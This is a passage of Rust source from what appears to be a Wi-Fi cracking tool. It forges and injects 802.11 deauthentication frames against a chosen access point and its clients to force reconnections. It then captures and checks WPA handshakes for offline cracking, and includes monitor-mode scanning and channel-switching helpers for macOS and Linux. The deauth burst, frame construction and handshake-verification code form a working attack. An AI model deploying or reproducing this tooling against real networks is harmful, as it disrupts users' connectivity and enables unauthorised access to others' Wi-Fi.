                    "⚠️ Channel switch to {new_channel} failed — still listening on the previous channel"
                ));
            }
            last_channel_switch = std::time::Instant::now();
        }

        // 2b. Linux: when locked to a single channel, periodically re-assert it.
        // NetworkManager/regulatory changes can silently move the card off the
        // target channel, which is why a reconnecting client's handshake is
        // sometimes never captured.
        #[cfg(target_os = "linux")]
        if channels_to_scan.len() == 1 && last_channel_switch.elapsed() >= Duration::from_secs(3) {
            set_channel_for_os(interface, channels_to_scan[0]);
            last_channel_switch = std::time::Instant::now();
        }

        // 3. Deauth logic.
        if !no_deauth {
            if parallel_deauth_active {
                // Keep the parallel sender's shared state up to date.
                if let Some(b) = target_bssid {
                    *shared_bssid.lock().unwrap() = Some(b);
                }
                {
                    let mut cl = shared_clients.lock().unwrap();
                    if cl.len() != pending_handshakes.len() {
                        cl.clear();
                        cl.extend(pending_handshakes.keys().copied());
                    }
                }
                // The dedicated thread already deauths continuously, so the
                // manual button is redundant here — just clear the flag.
                if let Some(flag) = &deauth_requested {
                    flag.store(false, Ordering::SeqCst);
                }
            } else if let (Some(bssid), false) = (target_bssid, deauth_tx_dead) {
                // Fallback (no second handle): in-capture burst every 0.5s.
                if last_deauth.elapsed() >= Duration::from_millis(500) {
                    let client_list: Vec<[u8; 6]> = pending_handshakes.keys().copied().collect();
                    let (_, error) = send_deauth_burst(&mut cap, &bssid, &client_list, 3);
                    if let Some(err) = error {
                        deauth_tx_dead = true;
                        log(&format!("⚠️ Periodic deauth is failing: {err}"));
                        log("💡 Raw injection appears blocked on this Mac — force the client to reconnect manually (WiFi OFF/ON).");
                    }
                    last_deauth = std::time::Instant::now();
                }
            }
        }

        // 4. Manual deauth trigger — only in fallback / passive mode (when the
        // parallel sender is not running). Sends one bounded burst on demand.
        if !parallel_deauth_active {
            if let Some(flag) = &deauth_requested {
                if flag.swap(false, Ordering::SeqCst) {
                    match target_bssid {
                        Some(bssid) => {
                            let client_list: Vec<[u8; 6]> =
                                pending_handshakes.keys().copied().collect();
                            let (sent, error) =
                                send_deauth_burst(&mut cap, &bssid, &client_list, 5);
                            let clients = client_list.len();
                            if let Some(err) = error {
                                log(&format!("❌ Manual deauth failed: {err}"));
                                log("💡 Raw injection appears blocked on this Mac — turn the target device's WiFi OFF/ON to force the handshake.");
                            } else {
                                log(&format!(
                                    "📣 Manual deauth burst: {sent} frames to {:02X}:{:02X}:{:02X}:{:02X}:{:02X}:{:02X} (broadcast + {clients} known client(s))",
                                    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]
                                ));
                            }
                        }
                        None => {
                            log("⚠️ Deauth requested, but the target AP has not been identified yet. Keep capturing until the target SSID's beacon is seen.");
                        }
                    }
                }
            }
        }
    }

    println!("\n{}", "🛑 Capture stopped.");
    println!("Total packets: {}", packets_count);

    // CRITICAL: Drop savefile to flush all packets to disk before verification
    drop(savefile);

    let mut captured_ssid: Option<String> = None;

    // Verify captured handshake is exploitable
    if let Some(target_ssid) = ssid {
        println!("\n{}", "🔍 Verifying captured handshake...");

        use crate::core::handshake::parse_cap_file;
        match parse_cap_file(std::path::Path::new(output_file), None) {
            Ok(handshake) => {
                // Verify the captured SSID matches the target
                if handshake.ssid != target_ssid {
                    println!("⚠️  Wrong SSID captured: '{}'", handshake.ssid);
                    println!("   Expected: '{}', but continuing capture...", target_ssid);

                    // Delete the file and continue
                    if let Err(e) = std::fs::remove_file(output_file) {
                        println!("⚠️  Failed to delete file: {}", e);
                    } else {
                        println!("🗑️  Deleted '{}' (wrong SSID, continuing)", output_file);
                    }

                    // Don't return error - just continue capturing
                    println!("🔄 Continuing capture for '{}'...\n", target_ssid);
                } else {
                    println!("✅ Handshake verified and ready to crack!");
                    println!("\nHandshake Details:");
                    println!("  SSID: {}", handshake.ssid);
                    println!(
                        "  AP MAC: {:02X}:{:02X}:{:02X}:{:02X}:{:02X}:{:02X}",
                        handshake.ap_mac[0],
                        handshake.ap_mac[1],
                        handshake.ap_mac[2],
                        handshake.ap_mac[3],
                        handshake.ap_mac[4],
                        handshake.ap_mac[5]
                    );
                    println!("  Key Version: {}", handshake.key_version);
                    captured_ssid = Some(handshake.ssid);
                }
            }
            Err(e) => {
                println!("⚠️  Handshake verification failed: {}", e);
                println!(
                    "   Expected SSID '{}' not found in capture file",
                    target_ssid
                );
                println!("\nPossible issues:");
                println!("  - Captured packets may be incomplete (missing M1 or M2)");
                println!("  - Wrong SSID specified (check the network name)");
                println!("  - Capture was too short to get a complete handshake");
                println!("\nTry running capture again for longer duration.");
            }
        }
    }

    Ok(captured_ssid)
}

/// Parse BSSID and SSID from beacon/probe response frames
fn parse_bssid_and_ssid_from_packet(data: &[u8]) -> Option<([u8; 6], String)> {
    // Basic check for radiotap header
    if data.len() < 50 {
        return None;
    }

    // Skip Radiotap (variable length)
    let radiotap_len = u16::from_le_bytes([data[2], data[3]]) as usize;
    if data.len() < radiotap_len + 24 {
        return None;
    }

    let frame = &data[radiotap_len..];

    // Frame Control: Type 0 = Management
    // Subtype 8 = Beacon, 5 = Probe Response
    let fc = frame[0];
    let f_type = (fc >> 2) & 0x3;
    let f_subtype = (fc >> 4) & 0xF;

    if f_type != 0 {
        return None;
    } // Not management
    if f_subtype != 8 && f_subtype != 5 {
        return None;
    } // Not Beacon/ProbeResp

    // Extract BSSID (Addr3 in management frames)
    let bssid: [u8; 6] = frame[16..22].try_into().ok()?;

    // Body starts at 24
    let body = &frame[24..];

    // Fixed Parameters: Timestamp (8) + Beacon Interval (2) + Cap Info (2) = 12 bytes
    if body.len() < 12 {
        return None;
    }

    let tags = &body[12..];
    let mut i = 0;
    while i < tags.len() {
        if i + 2 > tags.len() {
            break;
        }
        let id = tags[i];
        let len = tags[i + 1] as usize;
        let val_start = i + 2;
        let val_end = val_start + len;

        if val_end > tags.len() {
            break;
        }

        if id == 0 {
            // SSID Tag
            let ssid_bytes = &tags[val_start..val_end];
            if let Ok(ssid_str) = String::from_utf8(ssid_bytes.to_vec()) {
                return Some((bssid, ssid_str));
            }
            return None;
        }

        i = val_end;
    }

    None
}

/// Which link-layer encapsulation this platform expects on TX.
/// 0 = not probed yet, 1 = raw 802.11 (macOS BPF), 2 = radiotap + 802.11 (Linux).
static TX_FRAME_FORMAT: AtomicU8 = AtomicU8::new(0);

/// Build the progress logger for a capture run: lines always go to stdout and,
/// when a sink is provided, also to the GUI activity log.
fn capture_logger(
    sink: &Option<Arc<dyn Fn(&str) + Send + Sync>>,
) -> Arc<dyn Fn(&str) + Send + Sync> {
    match sink {
        Some(f) => f.clone(),
        None => Arc::new(|_: &str| {}),
    }
}

/// Send one deauth burst (broadcast + known clients, repeated) and report
/// `(frames_sent, first_error)`.
fn send_deauth_burst(
    cap: &mut Capture<pcap::Active>,
    bssid: &[u8; 6],
    clients: &[[u8; 6]],
    repeats: usize,
) -> (usize, Option<String>) {
    let mut sent = 0;
    let mut error: Option<String> = None;
    let broadcast: [u8; 6] = [0xFF; 6];
    for _ in 0..repeats {
        for target in std::iter::once(&broadcast).chain(clients.iter()) {
            match send_deauth(cap, bssid, target) {
                Ok(()) => sent += 1,
                Err(e) => {
                    if error.is_none() {
                        error = Some(e.to_string());
                    }
                }
            }
        }
    }
    (sent, error)
}

/// Build a raw 802.11 deauthentication frame (26-byte header + reason code).
fn build_deauth_frame(bssid: &[u8; 6], target: &[u8; 6]) -> Vec<u8> {
    let mut frame = Vec::with_capacity(26 + 2);

    // Frame Control: Type 0 (Mgmt), Subtype 12 (Deauth) -> 0xC0
    frame.push(0xC0);
    frame.push(0x00); // Flags

    // Duration
    frame.extend_from_slice(&[0x00, 0x01]);

    // Addr1: Destination
    frame.extend_from_slice(target);

    // Addr2: Source (AP BSSID)
    frame.extend_from_slice(bssid);

    // Addr3: BSSID (AP BSSID)
    frame.extend_from_slice(bssid);

    // Sequence Control (Fragment 0, Seq 0)
    frame.extend_from_slice(&[0x00, 0x00]);

    // Reason Code: 7 (Class 3 frame received from nonassociated STA)
    frame.extend_from_slice(&[0x07, 0x00]);

    frame
}

/// Minimal Radiotap header (version 0, no present fields).
fn prepend_radiotap(frame: &[u8]) -> Vec<u8> {
    let mut packet = Vec::with_capacity(8 + frame.len());
    packet.extend_from_slice(&[0x00, 0x00]); // Version/Pad
    packet.extend_from_slice(&[(8u8), 0x00]); // Length 8
    packet.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]); // Present flags (none)
    packet.extend_from_slice(frame);
    packet
}

/// Construct and send a Deauth frame.
///
/// macOS BPF writes transmit the buffer verbatim, so the frame must be the
/// raw 802.11 MAC frame there; Linux monitor interfaces usually expect a
/// radiotap header instead. The working format is probed once and memoized.
fn send_deauth(cap: &mut Capture<pcap::Active>, bssid: &[u8; 6], target: &[u8; 6]) -> Result<()> {
    let frame = build_deauth_frame(bssid, target);

    // Pick the encapsulation by OS, NOT by "did sendpacket return Ok". On Linux
    // monitor interfaces, writing a bare 802.11 frame succeeds at the syscall
    // level but the driver parses the leading bytes as a radiotap header, so the
    // frame never goes out — which made deauth silently do nothing. mac80211
    // expects radiotap + 802.11; macOS BPF expects the raw 802.11 frame.
    let preferred = match TX_FRAME_FORMAT.load(Ordering::Relaxed) {
        0 => {
            if cfg!(target_os = "linux") {
                2
            } else {
                1
            }
        }
        f => f,
    };

    let build = |fmt: u8| -> Vec<u8> {
        if fmt == 2 {
            prepend_radiotap(&frame)
        } else {
            frame.clone()
        }
    };

    match cap.sendpacket(build(preferred)) {
        Ok(()) => {
            TX_FRAME_FORMAT.store(preferred, Ordering::Relaxed);
            Ok(())
        }
        Err(primary_err) => {
            // Fall back to the other encapsulation once, in case the preferred
            // one is rejected by this particular driver.
            let alt = if preferred == 2 { 1 } else { 2 };
            match cap.sendpacket(build(alt)) {
                Ok(()) => {
                    TX_FRAME_FORMAT.store(alt, Ordering::Relaxed);
                    Ok(())
                }
                Err(alt_err) => Err(anyhow!(
                    "send error (fmt {}: {}; fmt {}: {})",
                    preferred,
                    primary_err,
                    alt,
                    alt_err
                )),
            }
        }
    }
}

/// Network information for Smart Connect support
#[derive(Debug, Clone)]
struct NetworkInfo {
    bssid: String,
    channel: u32,
    rssi: i32,
    band: WifiBand,
}

#[derive(Debug, Clone, PartialEq)]
enum WifiBand {
    Band24GHz,
    Band5GHz,
}

impl WifiBand {
    fn from_channel(ch: u32) -> Self {
        if ch <= 14 {
            WifiBand::Band24GHz
        } else {
            WifiBand::Band5GHz
        }
    }
}

/// Detect ALL channels for a given SSID (supports Smart Connect multi-BSSID)
fn detect_all_channels_for_ssid(ssid: &str, interface: &str) -> Vec<NetworkInfo> {
    use std::process::Command;

    println!("🔍 Scanning for SSID: '{}'", ssid);

    // Platform-aware scan (CoreWLAN on macOS, iw/nmcli on Linux). Raw
    // results — no duplicate compacting, so multi-channel APs are kept.
    let scan_result = if cfg!(target_os = "linux") {
        scan_networks_linux(interface)
    } else {
        scan_networks_swift()
    };
    if let Ok(networks) = scan_result {
        let mut results = Vec::new();
        for net in networks {
            if net.ssid == ssid {
                if let Ok(ch) = net.channel.parse::<u32>() {
                    let rssi = net.signal_strength.parse::<i32>().unwrap_or(-100);
                    results.push(NetworkInfo {
                        bssid: net.bssid,
                        channel: ch,
                        rssi,
                        band: WifiBand::from_channel(ch),
                    });
                }
            }
        }

        // Return results found by the platform scanner
        if !results.is_empty() {
            // Sort by RSSI
            results.sort_by_key(|net| std::cmp::Reverse(net.rssi));
            // Log
            for net in &results {
                println!(
                    "  ✓ '{}' - {} - Ch {} - {} dBm",
                    ssid, net.bssid, net.channel, net.rssi
                );
            }
            return results;
        }
    }

    // Legacy Airport Fallback (Keep simplified logic just in case user installs airport)
    let airport_paths = vec![
        "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport",
        "/usr/local/bin/airport",
        "airport",
    ];

    let mut airport_output = None;
    for path in &airport_paths {
        if let Ok(out) = Command::new(path).arg("-s").output() {
            if out.status.success() {
                airport_output = Some(out);
                break;
            }
        }
    }

    if let Some(out) = airport_output {
        let stdout = String::from_utf8_lossy(&out.stdout);
        // ... (We could parse it, but let's assume if Swift failed and this succeeded, we might be lucky)
        // For now, if Swift failed, we probably failed.
        // But let's leave the function returning empty if Swift failed.
        let _ = stdout;
    }

    // No networks found
    println!("⚠️  SSID '{}' not found in scanned networks", ssid);
    Vec::new()
}

/// Parse MAC address string (XX:XX:XX:XX:XX:XX) to [u8; 6]
fn parse_mac(mac_str: &str) -> Result<[u8; 6]> {
    let bytes: Vec<u8> = mac_str
        .split(':')
        .map(|s| u8::from_str_radix(s, 16))
        .collect::<Result<Vec<u8>, _>>()
        .map_err(|_| anyhow!("Invalid MAC address format"))?;

    if bytes.len() != 6 {
        return Err(anyhow!("Invalid MAC address length"));
    }

    let mut arr = [0u8; 6];
    arr.copy_from_slice(&bytes);
    Ok(arr)
}

/// Detect channels for a specific BSSID (with retries)
fn detect_channels_for_bssid(target_bssid: &str) -> Vec<NetworkInfo> {
    // Rely on Swift scanner
    for i in 1..=3 {
        if i > 1 {
            std::thread::sleep(Duration::from_millis(500));
        }

        if let Ok(networks) = scan_networks_swift() {
            let mut results = Vec::new();
            for net in networks {
                if net.bssid.eq_ignore_ascii_case(target_bssid) {
                    if let Ok(ch) = net.channel.parse::<u32>() {
                        let rssi = net.signal_strength.parse::<i32>().unwrap_or(-100);
                        results.push(NetworkInfo {
                            bssid: net.bssid.clone(),
                            channel: ch,
                            rssi,
                            band: WifiBand::from_channel(ch),
                        });
                    }
                }
            }
            if !results.is_empty() {
                return results;
            }
        }
    }
    Vec::new()
}

/// Helper to find the airport binary on macOS
fn find_airport_path() -> Option<String> {
    let paths = [
        "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport",
        "/System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport",
        "/usr/libexec/airportd",
        "/usr/sbin/airport",
        "/usr/local/bin/airport",
        "airport",
    ];

    for path in &paths {
        if *path == "airport" {
            if Command::new("which")
                .arg("airport")
                .output()
                .map(|o| o.status.success())
                .unwrap_or(false)
            {
                return Some("airport".to_string());
            }
        } else if std::path::Path::new(path).exists() {
            return Some(path.to_string());
        }
    }
    None
}

/// Helper to run the Embedded Swift scanner
fn scan_networks_swift() -> Result<Vec<WifiNetwork>> {
    // Check if swift is available first
    let swift_check = Command::new("which").arg("swift").output();
    if swift_check.is_err() || !swift_check.unwrap().status.success() {
        return Err(anyhow!(
            "Swift not found. Please install Xcode Command Line Tools: xcode-select --install"
        ));
    }

    // Simple, non-blocking Swift script that just scans without permission requests
    // Permission requests must be done by the main app binary with proper entitlements
    let script_content = r#"
import CoreWLAN
import Foundation

// Get WiFi interface
let client = CWWiFiClient.shared()
guard let interface = client.interface() else {
    print("{\"error\": \"no_wifi_interface\", \"message\": \"No WiFi interface found. Make sure WiFi is enabled.\"}")
    exit(0)
}

do {
    let networks = try interface.scanForNetworks(withSSID: nil)
    var result: [[String: Any]] = []

    for network in networks {
        var netInfo: [String: Any] = [:]
        netInfo["ssid"] = network.ssid ?? "<Hidden>"
        netInfo["bssid"] = network.bssid ?? ""
        netInfo["channel"] = network.wlanChannel?.channelNumber ?? 0
        netInfo["rssi"] = network.rssiValue

        // Build security string
        var sec = ""
        if network.supportsSecurity(.wpa3Personal) { sec += "WPA3 " }
        if network.supportsSecurity(.wpa2Personal) { sec += "WPA2 " }
        if network.supportsSecurity(.wpaPersonal) { sec += "WPA " }
        if network.supportsSecurity(.dynamicWEP) { sec += "WEP " }
        if network.supportsSecurity(.none) { sec += "Open " }
        netInfo["security"] = sec.trimmingCharacters(in: .whitespaces)

        result.append(netInfo)
    }

    let jsonData = try JSONSerialization.data(withJSONObject: ["networks": result], options: [])
    if let jsonString = String(data: jsonData, encoding: .utf8) {
        print(jsonString)
    }
} catch let error {
    let nsError = error as NSError
    // Provide more specific error messages
    if nsError.code == -3931 {
        print("{\"error\": \"location_services\", \"message\": \"Location Services required. Enable in System Settings > Privacy & Security > Location Services.\"}")
    } else if nsError.code == -3930 {
        print("{\"error\": \"wifi_disabled\", \"message\": \"WiFi is disabled. Please enable WiFi and try again.\"}")
    } else {
        print("{\"error\": \"scan_failed\", \"message\": \"\(error.localizedDescription)\"}")
    }
}
"#;

    let script_path = "/tmp/wifi_scan.swift";

    // Write script to temp file
    if let Err(e) = std::fs::write(script_path, script_content) {
        return Err(anyhow!("Failed to write Swift script: {}", e));
    }

    // Execute swift script with timeout (30 seconds max)
    let output = Command::new("swift")
        .arg(script_path)
        .output()
        .context("Failed to execute Swift scanner. Is Xcode Command Line Tools installed?")?;

    // Parse stdout even if exit status is non-zero (script might print error JSON)
    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);

    // Check for compilation errors
    if !output.status.success() && stdout.trim().is_empty() {
        if stderr.contains("no such module") {
            return Err(anyhow!(
                "CoreWLAN framework not available. This tool only works on macOS."
            ));
        }
        if !stderr.is_empty() {
            return Err(anyhow!("Swift compilation error: {}", stderr.trim()));
        }
        return Err(anyhow!("Swift scanner failed with unknown error"));
    }

    // Check for empty output
    if stdout.trim().is_empty() {
        if !stderr.is_empty() {
            return Err(anyhow!("Swift scanner error: {}", stderr.trim()));
        }
        return Err(anyhow!("Swift scanner returned empty output"));
    }

    // Parse JSON response
    #[derive(Deserialize)]
    struct SwiftResponse {
        networks: Option<Vec<SwiftNetwork>>,
        error: Option<String>,
        message: Option<String>,
    }

    #[derive(Deserialize)]
    struct SwiftNetwork {
        ssid: String,
        bssid: String,
        channel: serde_json::Value, // Can be int or string
        rssi: serde_json::Value,    // Can be int or string
        security: String,
    }

    let response: SwiftResponse = serde_json::from_str(&stdout).map_err(|e| {
        anyhow!(
            "Failed to parse Swift scanner output: {} (output: {})",
            e,
            stdout
        )
    })?;

    // Check for error with detailed message
    if let Some(error) = response.error {
        let message = response.message.unwrap_or_else(|| error.clone());
        return Err(anyhow!("{}", message));
    }

    // Extract networks
    let swift_networks = response.networks.unwrap_or_default();

    let networks: Vec<WifiNetwork> = swift_networks
        .into_iter()
        .map(|n| {
            // Handle channel/rssi which might be int or string
            let channel = match n.channel {
                serde_json::Value::Number(num) => num.to_string(),
                serde_json::Value::String(s) => s,
                _ => "0".to_string(),
            };
            let rssi = match n.rssi {
                serde_json::Value::Number(num) => num.to_string(),
                serde_json::Value::String(s) => s,
                _ => "-100".to_string(),
            };

            WifiNetwork {
                ssid: n.ssid,
                bssid: n.bssid,
                channel,
                signal_strength: rssi,
                security: n.security,
            }
        })
        .collect();

    Ok(networks)
}

/// Fallback: Scan using pcap (packet capture)
///
/// This is used when OS tools are missing or BSSIDs are hidden by privacy settings.
/// It attempts to:
/// 1. Open interface in monitor mode
/// 2. Hop through channels
/// 3. Collect Beacon/ProbeResponse frames to extract BSSIDs
pub fn scan_pcap(interface: &str) -> Result<Vec<WifiNetwork>> {
    use std::time::Instant;

    // Use BSSID as key to handle multiple SSIDs with same BSSID
    let mut networks_map: HashMap<String, WifiNetwork> = HashMap::new();

    // Attempt to open monitor mode
    let cap_builder = Capture::from_device(interface)
        .context("Failed to open device for pcap scan")?
        .promisc(true)
        .rfmon(true);

    let mut cap = cap_builder
        .timeout(100) // Short timeout for responsive scanning
        .snaplen(2000) // Only need headers
        .open()
        .map_err(|e| anyhow!("Failed to enable monitor mode: {}", e))?;

    println!("{} Monitor mode active. Scanning channels...", "[*]");

    // Prioritize common 2.4GHz channels first, then 5GHz
    let priority_channels = vec![
        1, 6, 11, // Most common 2.4GHz channels
        36, 40, 44, 48, // 5GHz UNII-1
        149, 153, 157, 161, // 5GHz UNII-3
        2, 3, 4, 5, 7, 8, 9, 10, // Other 2.4GHz
        52, 56, 60, 64, // 5GHz UNII-2
        100, 104, 108, 112, 116, 120, 124, 128, // 5GHz UNII-2 Extended
    ];

    let start_time = Instant::now();
    let max_scan_time = Duration::from_secs(15); // Max 15 seconds total scan

    for (idx, channel) in priority_channels.iter().enumerate() {
        if start_time.elapsed() >= max_scan_time {
            break; // Don't scan forever
        }

        // Set channel BEFORE opening capture on first iteration, or between reads
        let _ = set_channel_for_os(interface, *channel);

        // Give the hardware time to switch channels
        std::thread::sleep(Duration::from_millis(50));

        let hop_start = Instant::now();
        let dwell_time = if idx < 12 {
            Duration::from_millis(500) // Spend more time on priority channels
        } else {
            Duration::from_millis(250) // Quick scan for others
        };

        // Listen for beacons
        while hop_start.elapsed() < dwell_time {
            match cap.next_packet() {
                Ok(packet) => {
                    if let Some((bssid_bytes, ssid_str)) =
                        parse_bssid_and_ssid_from_packet(packet.data)
                    {
                        let bssid_str = format!(
                            "{:02X}:{:02X}:{:02X}:{:02X}:{:02X}:{:02X}",
                            bssid_bytes[0],
                            bssid_bytes[1],
                            bssid_bytes[2],
                            bssid_bytes[3],
                            bssid_bytes[4],
                            bssid_bytes[5]
                        );

                        // Use BSSID as key to avoid duplicates
                        if !networks_map.contains_key(&bssid_str) {
                            networks_map.insert(
                                bssid_str.clone(),
                                WifiNetwork {
                                    ssid: if ssid_str.is_empty() {
                                        "<Hidden>".to_string()
                                    } else {
                                        ssid_str
                                    },
                                    bssid: bssid_str,
                                    channel: channel.to_string(),
                                    signal_strength: "-".to_string(), // Could parse from radiotap
                                    security: "Unknown".to_string(), // Could parse from beacon tags
                                },
                            );

                            // Visual feedback
                            print!(
                                "\r{} networks found on {} channels... ",
                                networks_map.len(),
                                idx + 1
                            );
                            use std::io::Write;
                            std::io::stdout().flush().unwrap();
                        }
                    }
                }
                Err(pcap::Error::TimeoutExpired) => continue,
                Err(_) => break,
            }
        }
    }
    println!(); // Newline

    Ok(networks_map.into_values().collect())
}

/// Helper to set channel using Swift (CoreWLAN)
fn set_channel_swift(channel: u32) -> Result<()> {
    use std::io::Write;
    let script_content = format!(
        r#"
import CoreWLAN

let client = CWWiFiClient.shared()
if let interface = client.interface() {{
    do {{
        let allChannels = interface.supportedWLANChannels() ?? []
        if let targetChannel = allChannels.first(where: {{ $0.channelNumber == {} }}) {{
             try interface.setWLANChannel(targetChannel)
             print("OK")
        }} else {{
             print("Channel not supported")
             exit(1)
        }}
    }} catch {{
        print("Error: \(error)")
        exit(1)
    }}
}}
"#,
        channel
    );

    let script_path = "/tmp/wifi_ch_set.swift";
    let mut file = std::fs::File::create(script_path)?;
    file.write_all(script_content.as_bytes())?;

    let output = Command::new("swift").arg(script_path).output()?;

    if output.status.success() {
        Ok(())
    } else {
        Err(anyhow!("Failed to set channel"))
    }
}

/// Set channel on macOS using Swift or airport utility. Returns success.
fn set_channel_macos(_interface: &str, channel: u32) -> bool {
    // Try Swift first (modern macOS)
    if set_channel_swift(channel).is_ok() {
        return true;
    }

    if let Some(airport_path) = find_airport_path() {
        return Command::new(airport_path)
            .arg(format!("--channel={}", channel))
            .output()
            .map(|o| o.status.success())
            .unwrap_or(false);
    }

    false
}

// ============================================================================
// Linux platform support (iw / nmcli / ip)
//
// The helpers below are plain `Command` wrappers, so they compile everywhere
// and are only invoked through `cfg!(target_os = "linux")` branches.
// ============================================================================

/// Scan via `iw dev <iface> scan`, falling back to `nmcli` (NetworkManager).
fn scan_networks_linux(interface: &str) -> Result<Vec<WifiNetwork>> {
    // Preferred: iw (works headless, needs root).
    if let Ok(output) = Command::new("iw").args(["dev", interface, "scan"]).output() {
        if output.status.success() {
            let stdout = String::from_utf8_lossy(&output.stdout);
            let networks = parse_iw_scan(&stdout);
            if !networks.is_empty() {
                return Ok(networks);
            }
        }
    }

    // Fallback: nmcli (no root needed, requires NetworkManager).
    if let Ok(output) = Command::new("nmcli")
        .args([
            "-t",
            "-f",
            "SSID,BSSID,CHAN,SIGNAL,SECURITY",
            "device",
            "wifi",
            "list",
        ])
        .output()
    {
        if output.status.success() {
            let stdout = String::from_utf8_lossy(&output.stdout);
            let networks = parse_nmcli_scan(&stdout);
            if !networks.is_empty() {
                return Ok(networks);
            }
        }
    }

    Err(anyhow!(
        "no networks found via iw/nmcli — is 'iw' installed and are you running with sudo?"
    ))
}

/// Parse `iw dev <iface> scan` output into networks.
fn parse_iw_scan(output: &str) -> Vec<WifiNetwork> {
    let mut networks = Vec::new();

    struct Partial {
        bssid: String,
        ssid: Option<String>,
        channel: Option<u32>,
        signal: Option<String>,
        rsn: bool,
        wpa: bool,
        privacy: bool,
    }
    impl Partial {
        fn finish(self) -> WifiNetwork {
            WifiNetwork {
                ssid: match self.ssid {
                    Some(s) if !s.is_empty() => s,
                    _ => "<Hidden>".to_string(),
                },
                bssid: self.bssid,
                channel: self.channel.unwrap_or(0).to_string(),
                signal_strength: self.signal.unwrap_or_else(|| "-100".to_string()),
                security: linux_security_string(self.rsn, self.wpa, self.privacy),
            }
        }
    }

    let mut current: Option<Partial> = None;
    for line in output.lines() {
        if let Some(rest) = line.strip_prefix("BSS ") {
            if let Some(done) = current.take() {
                networks.push(done.finish());
            }
            let bssid = rest.split('(').next().unwrap_or("").trim().to_string();
            current = Some(Partial {
                bssid,
                ssid: None,
                channel: None,
                signal: None,
                rsn: false,
                wpa: false,
                privacy: false,
            });
            continue;
        }

        let Some(part) = current.as_mut() else {
            continue;
        };
        let trimmed = line.trim();
        if let Some(value) = trimmed.strip_prefix("freq:") {
            if let Ok(freq) = value.trim().parse::<u32>() {
                part.channel = freq_to_channel(freq);
            }
        } else if let Some(value) = trimmed.strip_prefix("signal:") {
            // "-61.00 dBm" → "-61"
            if let Some(dbm) = value.split_whitespace().next() {
                part.signal = Some(dbm.split('.').next().unwrap_or(dbm).to_string());
            }
        } else if let Some(value) = trimmed.strip_prefix("SSID:") {
            part.ssid = Some(value.trim().to_string());
        } else if let Some(value) = trimmed.strip_prefix("DS Parameter set: channel") {
            if let Ok(ch) = value.trim().parse::<u32>() {
                part.channel = Some(ch);
            }
        } else if trimmed.starts_with("RSN") {
            part.rsn = true;
        } else if trimmed.starts_with("WPA") {
            part.wpa = true;
        } else if trimmed.starts_with("capability:") && trimmed.contains("Privacy") {
            part.privacy = true;
        }
    }
    if let Some(done) = current.take() {
        networks.push(done.finish());
    }

    networks
}

/// Parse `nmcli -t` (terse, `:`-separated with escaped colons) scan output.
fn parse_nmcli_scan(output: &str) -> Vec<WifiNetwork> {
    let mut networks = Vec::new();
    for line in output.lines() {
        let fields = split_nmcli_terse(line);
        if fields.len() < 5 || (fields[0].is_empty() && fields[1].is_empty()) {
            continue;
        }
        // nmcli reports signal strength 0-100; approximate dBm.
        let signal_dbm = fields[3]
            .parse::<i32>()
            .map(|s| s / 2 - 100)
            .unwrap_or(-100);
        networks.push(WifiNetwork {
            ssid: if fields[0].is_empty() {
                "<Hidden>".to_string()
            } else {
                fields[0].clone()
            },
            bssid: fields[1].clone(),
            channel: fields[2].clone(),
            signal_strength: signal_dbm.to_string(),
            security: fields[4].clone(),
        });
    }
    networks
}

/// Split an nmcli terse line on unescaped ':'.
fn split_nmcli_terse(line: &str) -> Vec<String> {
    let mut fields = Vec::new();
    let mut current = String::new();
    let mut escaped = false;
    for ch in line.chars() {
        match (escaped, ch) {
            (true, c) => {
                current.push(c);
                escaped = false;
            }
            (false, '\\') => escaped = true,
            (false, ':') => fields.push(std::mem::take(&mut current)),
            (false, c) => current.push(c),
        }
    }
    fields.push(current);
    fields
}

fn freq_to_channel(freq: u32) -> Option<u32> {
    match freq {
        2412..=2472 => Some((freq - 2407) / 5),
        2484 => Some(14),
        5160..=5885 => Some((freq - 5000) / 5),
        _ => None,
    }
}

fn linux_security_string(rsn: bool, wpa: bool, wep_privacy: bool) -> String {
    match (rsn, wpa) {
        (true, true) => "WPA/WPA2".to_string(),
        (true, false) => "WPA2".to_string(),
        (false, true) => "WPA".to_string(),
        (false, false) if wep_privacy => "WEP".to_string(),
        _ => String::new(), // open
    }
}

/// Currently associated SSID via `iwgetid`, falling back to nmcli.
fn check_wifi_connected_linux() -> Option<String> {
    if let Ok(output) = Command::new("iwgetid").arg("-r").output() {
        if output.status.success() {
            let ssid = String::from_utf8_lossy(&output.stdout).trim().to_string();
            if !ssid.is_empty() {
                return Some(ssid);
            }
        }
    }
    if let Ok(output) = Command::new("nmcli")
        .args(["-t", "-f", "active,ssid", "device", "wifi"])
        .output()
    {
        if output.status.success() {
            for line in String::from_utf8_lossy(&output.stdout).lines() {
                if let Some(rest) = line.strip_prefix("yes:") {
                    let ssid = split_nmcli_terse(rest).join("");
                    if !ssid.is_empty() {
                        return Some(ssid);
                    }
                }
            }
        }
    }
    None
}

/// First wireless interface name from `iw dev`.
pub(crate) fn first_wireless_interface_linux() -> Option<String> {
    let output = Command::new("iw").arg("dev").output().ok()?;
    for line in String::from_utf8_lossy(&output.stdout).lines() {
        if let Some(name) = line.trim().strip_prefix("Interface ") {
            return Some(name.to_string());
        }
    }
    None
}

/// Disconnect Wi-Fi on Linux (nmcli first so it does not auto-rejoin).
fn disconnect_wifi_linux() -> Result<()> {
    let interface =
        first_wireless_interface_linux().ok_or_else(|| anyhow!("no wireless interface found"))?;

    let nmcli_ok = Command::new("nmcli")
        .args(["device", "disconnect", &interface])
        .output()
        .map(|o| o.status.success())
        .unwrap_or(false);
    if nmcli_ok {
        return Ok(());
    }

    Command::new("iw")
        .args(["dev", &interface, "disconnect"])
        .output()
        .map_err(|e| anyhow!("failed to disconnect {interface}: {e}"))?;
    Ok(())
}

/// Set the channel with `iw` (mac80211).
fn set_channel_linux(interface: &str, channel: u32) -> bool {
    Command::new("iw")
        .args(["dev", interface, "set", "channel", &channel.to_string()])
        .output()
        .map(|o| o.status.success())
        .unwrap_or(false)
}

/// Platform-aware channel switch used by the capture engine.
fn set_channel_for_os(interface: &str, channel: u32) -> bool {
    if cfg!(target_os = "linux") {
        set_channel_linux(interface, channel)
    } else {
        set_channel_macos(interface, channel)
    }
}

